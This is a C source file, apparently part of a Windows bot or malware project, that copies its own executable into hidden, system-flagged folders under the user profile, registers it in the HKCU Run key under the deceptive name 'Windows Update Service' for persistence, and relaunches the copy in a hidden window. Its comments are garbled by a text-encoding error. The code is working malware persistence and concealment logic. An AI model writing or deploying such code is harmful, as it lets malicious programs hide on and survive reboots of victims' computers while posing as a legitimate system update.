#include "header.h"
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <tchar.h>

static const wchar_t* preferred_paths[] = {
    L"\\AppData\\Roaming",
    L"\\AppData\\Local",
    L"\\AppData\\Local\\Microsoft\\Windows\\INetCache",
    L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
    L"\\Local Settings\\Application Data",
    L"\\Application Data",
    L"\\Public\\Documents",
    L"\\Windows\\System32\\spool\\drivers\\color",
    L"\\Temp"
};

// ��ȡ��ǰģ��·��
void get_current_module_path(wchar_t* path, size_t len) {
    GetModuleFileNameW(NULL, path, (DWORD)len);
    path[len - 1] = L'\0';
}

// ��ȡ AppData\\Local ·��
void get_appdata_path(wchar_t* path, size_t len) {
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        path[len - 1] = L'\0';
    }
    else {
        path[0] = L'\0';
    }
}

// ��������Ŀ¼�������������
int create_hidden_directory(const wchar_t* path) {
    DWORD attr = GetFileAttributesW(path);
    char buf[MAX_PATH];
    UnicodeToAnsi(path, buf, MAX_PATH);
    if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
        bot_log("[+] Directory already exists: %s\n", buf);
        return 0;  // �Ѵ��ڣ����贴��
    }

    if (!CreateDirectoryW(path, NULL)) {
        bot_log("[!] Failed to create directory: %s (Error: %d)\n", buf, GetLastError());
        return -1;
    }

#ifdef FILE_ATTR_HIDDEN
    if (!SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
        bot_log("[!] Failed to set hidden attributes for folder: %s\n", buf);
        return -1;
    }
#endif

    bot_log("[+] Created folder: %s\n", buf);
    return 0;
}

// ������������
int copy_and_hide_bot() {

    char buf[MAX_PATH];

    //get current_path
    wchar_t current_path[MAX_PATH];
    get_current_module_path(current_path, MAX_PATH);
    UnicodeToAnsi(current_path, buf, MAX_PATH);
    bot_log("[+] Current module path: %s\n", buf);

    //get user profile
    wchar_t user_profile[MAX_PATH];
    if (!SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, user_profile))) {
        bot_log("[!] Failed to get user profile\n");
        return -1;
    }

    for (int i = 0; i < ARRAYSIZE(preferred_paths); ++i) {
        wchar_t full_path[MAX_PATH];
        swprintf(full_path, MAX_PATH, L"%s%s", user_profile, preferred_paths[i]);

        // ����Ŀ¼
        if (create_hidden_directory(full_path) != 0) //If fail
            continue;

        // ��������·��
        wchar_t final_path[MAX_PATH];
        swprintf(final_path, MAX_PATH, L"%s\\%s", full_path, TARGET_EXE_NAME);

        // ���Ը���
        if (CopyFileW(current_path, final_path, FALSE)) {
            UnicodeToAnsi(final_path, buf, MAX_PATH);
            bot_log("[+] Successfully copied to: %ls\n", buf);
#ifdef FILE_ATTR_HIDDEN
            SetFileAttributesW(final_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
#endif

            if (set_registry_persistence(final_path) != 0)
                bot_log("[!] Failed to set registry persistence\n");
            else 
                bot_log("[+] Registry persistence set\n");

            // Launch copy
            SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
            sei.lpVerb = L"open";
            sei.lpFile = final_path;
            sei.nShow = SW_HIDE;


            if (!ShellExecuteExW(&sei)) {
                bot_log("[!] Failed to launch hidden instance (Error: %d)\n", GetLastError());
                return -1;
            }

            bot_log("[+] Hidden instance launched successfully\n");
            break;
        }
        else {
            DWORD err = GetLastError();
            UnicodeToAnsi(full_path, buf, MAX_PATH);
            bot_log("[!] Copy failed to %ls: %d\n", buf, err);
        }
    }

    return 0;


}

// ע������������
int set_registry_persistence(const wchar_t* bot_path) {
    HKEY hKey;
    LONG res = RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    if (res != ERROR_SUCCESS) {
        bot_log("[!] Failed to open Run key\n");
        return -1;
    }

    res = RegSetValueExW(hKey, L"Windows Update Service", 0, REG_SZ, (BYTE*)bot_path, (wcslen(bot_path) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);

    if (res != ERROR_SUCCESS) {
        bot_log("[!] Failed to write registry key\n");
        return -1;
    }

    return 0;
}

int delete_registry_persistence() {
    HKEY hKey;
    LONG res = RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    if (res != ERROR_SUCCESS) {
        bot_log("[!] Failed to open Run key\n");
        return -1;
    }

    // ɾ����Ϊ "Windows Update Service" ��ע���ֵ
    res = RegDeleteValueW(hKey, L"Windows Update Service");
    RegCloseKey(hKey);

    if (res != ERROR_SUCCESS) {
        bot_log("[!] Failed to delete registry value\n");
        return -1;
    }

    return 0;
}


// ���ע������Ƿ���ڣ��ж��Ƿ��Ѿ������ظ���
int is_hidden_bot() {
    HKEY hKey;
    LONG res = RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    if (res != ERROR_SUCCESS) {
        bot_log("[!] Failed to open Run key for checking persistence\n");
        return 0; // ע����޷����ʣ�Ĭ����Ϊ�������ظ���
    }

    wchar_t value_path[MAX_PATH];
    DWORD value_size = sizeof(value_path);
    DWORD type;

    res = RegQueryValueExW(hKey, L"Windows Update Service", NULL, &type, (BYTE*)value_path, &value_size);
    RegCloseKey(hKey);

    if (res == ERROR_SUCCESS && type == REG_SZ) {
        // ע�������ڣ�˵���Ѿ���һ�����ظ���
        char log_buf[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, value_path, -1, log_buf, MAX_PATH, NULL, NULL);
        bot_log("[+] Already registered in registry: %s\n", log_buf);
        return 1;
    }
    else {
        // �����ڻ����Ͳ���
        bot_log("[+] No existing registry persistence found\n");
        return 0;
    }
}